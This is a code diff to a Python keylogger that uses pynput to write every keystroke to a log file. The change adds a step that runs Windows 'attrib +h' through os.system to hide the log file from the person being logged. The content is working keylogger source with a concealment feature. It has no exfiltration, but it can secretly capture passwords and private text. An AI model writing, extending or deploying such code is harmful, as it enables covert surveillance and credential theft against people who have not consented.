@@ -2,8 +2,16 @@
 
 from pynput import keyboard
 import logging
+import os
 
-logging.basicConfig(filename='log.txt',level=logging.DEBUG, filemode= 'w', format= '%(asctime)s - %(message)s', datefmt = '%d-%b-%y %H:%M:%S')
+filename = 'log.txt'
+logging.basicConfig(filename=filename,level=logging.DEBUG, filemode= 'w', format= '%(asctime)s - %(message)s', datefmt = '%d-%b-%y %H:%M:%S')
+#set the file log.txt to become hidden, print error results in the log.
+try:
+    os.system(f'attrib +h {filename}')
+    logging.info("file set as hidden.")
+except Exception as e:
+    logging.info("error setting file as hidden.")
 
 def on_press(key):
     #Logs the keystroke into log.txt
